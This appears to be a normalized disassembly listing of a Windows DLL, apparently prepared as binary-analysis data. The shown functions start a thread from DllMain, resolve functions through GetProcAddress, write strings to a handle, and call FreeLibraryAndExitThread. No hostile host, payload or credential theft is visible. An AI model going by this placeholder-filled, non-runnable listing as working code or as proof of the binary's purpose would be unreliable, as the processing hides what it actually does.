sub_10001010
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10016fb6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100173b1
add esp 0x4
sub_10001050
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
mov eax 0x1
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push sub_100010a0
push 0x0
push 0x0
mov [ rw-data ] eax
call [ CreateThread@IAT ]
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ CloseHandle@IAT ]
pop ebp
retn 0xc
sub_100010a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1002942a
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc8 ]
mov [ fs : 0x0 ] eax
push 0x24
call sub_1001740d
mov esi eax
add esp 0x4
mov [ esp + 0x2c ] esi
xor ebx ebx
mov [ esp + 0xd0 ] ebx
lea edi [ ebx + 0x7 ]
cmp esi ebx
je r-xdata
mov [ esp + 0x18 ] ebx
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x4c ] esp
mov [ ecx ] ax
push 0x1
mov eax r--data
call sub_10001f10
sub esp 0x1c
mov ecx esp
mov [ esp + 0x108 ] 0x1
mov [ esp + 0x6c ] esp
xor edx edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push 0xd
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov [ esp + 0x108 ] bl
call sub_10005280
mov [ esp + 0x18 ] eax
jmp r-xdata
cmp al bl
jne r-xdata
mov edi [ esp + 0x18 ]
mov [ esp + 0xd0 ] 0xffffffff
xor al al
mov esi 0x1
jmp r-xdata
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
xor ecx ecx
mov edi eax
mov [ esp + 0x6c ] cx
push 0x32
mov eax r--data
lea ecx [ esp + 0x70 ]
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] ebx
call sub_10001f10
mov [ esp + 0xd0 ] 0x2
cmp edi ebx
je r-xdata
mov eax edi
call sub_100054c0
mov [ esp + 0x17 ] al
cmp al bl
jne r-xdata
mov esi [ esp + 0x7c ]
mov eax [ esp + 0x6c ]
add esi esi
cmp [ esp + 0x80 ] 0x8
jae r-xdata
push 0x1c
call sub_1001740d
add esp 0x4
cmp eax ebx
je r-xdata
inc esi
cmp esi 0x5
jbe r-xdata
push 0xbb8
call [ Sleep@IAT ]
mov edi [ esp + 0x18 ]
mov edx [ edi + 0x4 ]
push ebx
lea ecx [ esp + 0x3c ]
push ecx
push esi
push eax
push edx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x6c ]
xor esi esi
xor edx edx
mov [ eax + 0x14 ] 0x7
mov [ eax + 0x10 ] ebx
mov [ eax ] dx
mov esi eax
jmp r-xdata
mov al [ esp + 0x17 ]
cmp [ esp + 0x17 ] bl
je r-xdata
mov [ esp + 0xd0 ] 0xffffffff
cmp [ esp + 0x80 ] 0x8
jb r-xdata
cmp esi [ esp + 0x38 ]
jne r-xdata
cmp esi ebx
je r-xdata
push 0x2
mov eax r--data
lea ecx [ esp + 0x70 ]
call sub_10001cd0
push ebx
push esi
or eax 0xffffffff
lea edi [ esp + 0x74 ]
call sub_10001c20
push esi
call edi
add esp 0x4
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov edi [ esp + 0x18 ]
xor eax eax
mov [ esp + 0x80 ] 0x7
mov [ esp + 0x7c ] ebx
mov [ esp + 0x6c ] ax
mov edx [ esp + 0x6c ]
push edx
call sub_100173b1
add esp 0x4
mov eax [ edi + 0x4 ]
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
setne al
cmp al bl
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ rw-data ]
push ebx
push ecx
call [ FreeLibraryAndExitThread@IAT ]
int3
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
push edi
lea esi [ esp + 0x70 ]
call sub_10005400
test al al
je r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] ax
call sub_100173b1
add esp 0x4
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
mov [ esp + 0x3c ] 0x20
lea esp [ esp ]
mov edx [ esp + 0x64 ]
mov ecx [ esp + 0x50 ]
mov eax ecx
cmp edx 0x8
jae r-xdata
lea ecx [ eax + 0x1 ]
push 0xffffffff
lea eax [ esp + 0xa8 ]
mov edx edi
call sub_10001b50
mov ecx eax
lea edx [ esp + 0x40 ]
mov [ esp + 0xd0 ] 0x5
call sub_10003620
mov [ esp + 0x34 ] eax
lea edx [ esp + 0x1c ]
cmp edx eax
je r-xdata
mov esi [ esp + 0x60 ]
lea eax [ eax + esi * 2 ]
cmp edx 0x8
jae r-xdata
lea eax [ esp + 0x50 ]
mov esi [ esp + 0x40 ]
cmp esi ebx
je r-xdata
mov esi [ esp + 0x1c ]
cmp esi ebx
je r-xdata
mov edx [ esp + 0x2c ]
push edx
push eax
push ecx
lea eax [ esp + 0x94 ]
mov esi 0xf
push eax
mov [ esp + 0xac ] esi
mov [ esp + 0xa8 ] ebx
mov [ esp + 0x98 ] bl
call sub_10002880
mov [ esp + 0xd0 ] 0x8
cmp [ esp + 0x9c ] 0x10
mov eax [ esp + 0x88 ]
jae r-xdata
lea ecx [ esp + 0x50 ]
mov [ esp + 0xd0 ] 0x4
cmp [ esp + 0xb8 ] 0x8
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
jb r-xdata
mov edi [ esp + 0x44 ]
cmp esi edi
je r-xdata
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov ecx [ eax ]
mov [ esp + 0x1c ] ecx
mov edx [ eax + 0x4 ]
mov [ esp + 0x20 ] edx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
mov ecx [ rw-data ]
push eax
push ecx
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x88 ]
mov ecx [ esp + 0x30 ]
push ecx
xor ecx ecx
lea eax [ esp + 0xa8 ]
lea edx [ esp + 0x54 ]
call sub_10001b50
mov esi eax
lea edx [ esp + 0x50 ]
cmp edx esi
je r-xdata
mov eax [ esp + 0xa4 ]
push eax
call sub_100173b1
add esp 0x4
push esi
call sub_100173b1
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push esi
call sub_100173b1
mov eax [ esp + 0x38 ]
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push 0xa
mov eax r--data
lea ecx [ esp + 0x70 ]
call sub_10001f10
push ebx
lea eax [ esp + 0x54 ]
push eax
or eax 0xffffffff
lea edi [ esp + 0x74 ]
call sub_10001c20
push 0x10
mov eax r--data
mov ecx edi
call sub_10001cd0
mov edi [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
lea edx [ esp + 0x1c ]
push edx
push edi
call eax
add esp 0x8
test al al
je r-xdata
mov [ esp + 0xd0 ] 0x4
cmp [ esp + 0xb8 ] 0x8
jb r-xdata
cmp [ esp + 0x64 ] 0x8
jb r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ edi + 0x4 ]
push ebx
lea ecx [ esp + 0x30 ]
push ecx
push esi
push eax
push edx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x6c ]
cmp [ esp + 0x9c ] 0x10
jb r-xdata
push 0x1
mov eax r--data
lea ecx [ esp + 0x70 ]
call sub_10001f10
jmp r-xdata
mov edx [ esp + 0xa4 ]
push edx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov edi 0x7
mov [ esp + 0x64 ] edi
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
mov esi [ esp + 0x40 ]
mov esi [ esp + 0x1c ]
cmp [ esp + 0x9c ] 0x10
jb r-xdata
cmp esi [ esp + 0x2c ]
jne r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x9c ] esi
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
cmp eax ebx
je r-xdata
mov eax [ esp + 0x88 ]
push eax
call sub_100173b1
add esp 0x4
mov esi [ esp + 0x7c ]
mov eax [ esp + 0x6c ]
add esi esi
cmp [ esp + 0x80 ] 0x8
jae r-xdata
mov ecx [ esi ]
mov [ esp + 0x50 ] ecx
mov [ esi ] ebx
mov eax [ esi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
lea eax [ esp + 0x54 ]
push esi
push eax
call sub_10017050
add esp 0xc
jmp r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x9c ] 0xf
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x88 ]
push ecx
call sub_100173b1
add esp 0x4
mov eax [ edi + 0x4 ]
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
setne al
cmp al bl
je r-xdata
cmp [ esp + 0x64 ] 0x8
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
jb r-xdata
mov edi [ esp + 0x20 ]
call sub_100021d0
mov ecx [ esp + 0x1c ]
push ecx
call sub_100173b1
add esp 0x4
mov edx [ esi + 0x10 ]
mov [ esp + 0x60 ] edx
mov eax [ esi + 0x14 ]
mov [ esp + 0x64 ] eax
xor ecx ecx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ esp + 0x64 ] 0x8
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
jb r-xdata
mov edi [ esp + 0x20 ]
call sub_100021d0
mov edx [ esp + 0x1c ]
push edx
call sub_100173b1
add esp 0x4
cmp [ esp + 0x9c ] 0x10
jb r-xdata
xor eax eax
mov [ esp + 0x50 ] ax
jmp r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_100173b1
add esp 0x4
xor ecx ecx
mov [ esp + 0x50 ] cx
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
mov esi [ esp + 0x1c ]
mov [ esp + 0x9c ] 0xf
mov [ esp + 0x98 ] ebx
mov [ esp + 0x88 ] bl
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x88 ]
push ecx
call sub_100173b1
add esp 0x4
mov [ esp + 0x60 ] ebx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0xd0 ] 0x2
cmp [ esp + 0x64 ] 0x8
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
jb r-xdata
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
mov edx [ esp + 0x18 ]
xor ecx ecx
push edx
lea esi [ esp + 0x70 ]
mov [ esp + 0x68 ] 0x7
mov [ esp + 0x64 ] ebx
mov [ esp + 0x54 ] cx
call sub_10005400
test al al
jne r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
push esi
call sub_100173b1
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
lea edx [ esp + 0x70 ]
xor ecx ecx
push edx
or eax 0xffffffff
lea edi [ esp + 0x58 ]
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x68 ] ebx
mov [ esp + 0x58 ] cx
call sub_10001db0
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
lea eax [ esp + 0x3c ]
push eax
mov ecx edi
push ecx
mov [ esp + 0xd8 ] 0x4
call sub_10001e60
mov [ esp + 0x30 ] eax
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] dx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
mov esi [ esp + 0x1c ]
sub_10001850
push ebp
mov ebp esp
push 0xffffffff
push sub_100289a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor edi edi
mov [ ebp - 0x4 ] edi
xor eax eax
mov [ ebp - 0x2c ] ax
push 0x1
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] edi
call sub_10001f10
push edi
lea ecx [ ebp + 0x8 ]
push ecx
or eax 0xffffffff
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001c20
mov edi [ ebp - 0x1c ]
mov eax [ ebp - 0x2c ]
xor bl bl
add edi edi
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push edi
push eax
mov eax [ esi + 0x4 ]
push eax
call [ WriteFile@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edi [ ebp - 0x30 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ esi + 0x4 ]
push ecx
call [ FlushFileBuffers@IAT ]
test eax eax
setne bl
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call sub_100173b1
add esp 0x4
ping
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x28 ] esp
mov [ ecx ] ax
push 0x4
mov eax r--data
mov [ ebp - 0x2c ] edi
call sub_10001f10
mov ecx ebx
call sub_10001850
mov esi [ edi ]
add esp 0x1c
cmp esi [ edi + 0x4 ]
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
mov esp ebp
pop ebp
retn
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x28 ] esp
mov [ ecx ] ax
push 0x1
mov eax r--data
call sub_10001f10
mov ecx ebx
call sub_10001850
add esp 0x1c
xor ecx ecx
mov [ ebp - 0x20 ] cx
push 0xc
mov eax r--data
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] 0x7
mov [ ebp - 0x10 ] 0x0
call sub_10001f10
push 0x0
push esi
or eax 0xffffffff
lea edi [ ebp - 0x20 ]
call sub_10001c20
sub esp 0x1c
mov edi esp
xor edx edx
mov [ ebp - 0x28 ] esp
push edx
lea eax [ ebp - 0x20 ]
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
or eax 0xffffffff
mov [ edi ] dx
call sub_10001db0
mov ecx ebx
call sub_10001850
add esp 0x1c
cmp [ ebp - 0xc ] 0x8
mov [ ebp - 0x21 ] al
jb r-xdata
mov edx [ ebp - 0x2c ]
mov al [ ebp - 0x21 ]
add esi 0x1c
cmp esi [ edx + 0x4 ]
jne r-xdata
mov ecx [ ebp - 0x20 ]
push ecx
call sub_100173b1
add esp 0x4
sub_10001a80
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
sub_10001ab0
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx eax
push edi
lea edi [ ecx + 0x2 ]
lea esp [ esp ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
mov ecx esi
call sub_10001f10
mov eax esi
pop edi
retn
sub_10001b20
push ebp
mov ebp esp
mov ecx eax
push esi
lea esi [ ecx + 0x2 ]
lea esp [ esp ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10001f10
pop esi
pop ebp
retn 0x4
sub_10001b50
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] 0x7
push ecx
mov [ ebp - 0x4 ] eax
mov [ edi ] ax
mov eax [ ebp + 0x8 ]
push edx
call sub_10001db0
mov eax edi
pop edi
mov esp ebp
pop ebp
retn 0x4
sub_10001b80
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_100021d0
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
pop edi
sub_10001bb0
cmp esi edi
je r-xdata
mov eax esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ edi ]
mov [ esi ] ecx
mov [ edi ] 0x0
mov edx [ edi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push edi
push esi
call sub_10017050
add esp 0xc
jmp r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
sub_10001c20
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_10015d4c
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_10015cff
mov eax edi
pop ebx
pop ebp
retn 0x8
push esi
lea esi [ eax + ebx ]
mov eax edi
call sub_100020a0
test al al
je r-xdata
pop esi
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ edi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_100183c0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10001cd0
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov edi ecx
test ebx ebx
je r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ ebp + 0x8 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ecx ecx
je r-xdata
push r--data
call sub_10015cff
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x4
push esi
lea esi [ eax + ecx ]
mov eax edi
call sub_100020a0
test al al
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp ebx eax
jb r-xdata
pop esi
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax ebx
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
mov eax edi
pop edi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + ecx ]
mov ecx [ edi + 0x10 ]
push edx
lea edx [ eax + ecx * 2 ]
push ebx
push edx
call sub_100183c0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
mov eax edi
sub ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
push ebx
push edi
call sub_10001c20
pop edi
pop ebx
pop ebp
retn 0x4
mov eax [ edi ]
sub ebx eax
mov eax [ ebp + 0x8 ]
sar ebx 0x1
push ebx
push edi
call sub_10001c20
pop edi
pop ebx
pop ebp
retn 0x4
sub_10001db0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ecx + 0x10 ]
cmp esi ebx
jae r-xdata
sub esi ebx
cmp eax esi
jae r-xdata
push r--data
call sub_10015d4c
cmp edi ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_100020a0
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_10002020
mov eax ebx
xor ecx ecx
call sub_10002020
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ edi ]
xor edx edx
mov [ ebx + eax ] dx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
lea ebx [ esi + esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_100183c0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10001e60
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp eax 0x1
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
mov edi eax
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
movzx edx [ ebx ]
mov [ ebp - 0x4 ] eax
mov ecx edi
test edi edi
je r-xdata
test eax eax
je r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov esi 0x1
mov edx ebx
mov ecx eax
lea esp [ esp ]
cmp [ eax ] dx
je r-xdata
sbb edx edx
and edx 0xfffffffe
inc edx
je r-xdata
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebp + 0xc ]
mov ecx eax
sub ecx [ ebp - 0x4 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
mov bx [ ecx ]
cmp bx [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ecx ]
sub_10001f10
push ebp
mov ebp esp
push esi
mov esi eax
push edi
mov edi ecx
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x7ffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_10015cff
mov eax edi
mov eax [ edi ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
push ecx
push ebx
push edi
call sub_100022f0
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp esi eax
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
pop ebx
mov eax edi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
xor edx edx
pop ebx
mov [ eax ] dx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax esi
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ ebx + eax ] cx
mov eax [ edi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
add ebx ebx
push ebx
push esi
push eax
call sub_100183c0
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] eax
jb r-xdata
mov eax edi
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_10001db0
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_10001db0
pop edi
pop esi
pop ebp
retn 0x4
sub_10002020
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10015d4c
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax esi
pop edi
retn
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_10017050
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_100020a0
cmp esi 0x7ffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_10015cff
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_100022f0
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x8
jb r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ eax ]
sub_100020f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100290c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp esi eax
je r-xdata
mov ecx ebx
call sub_10002460
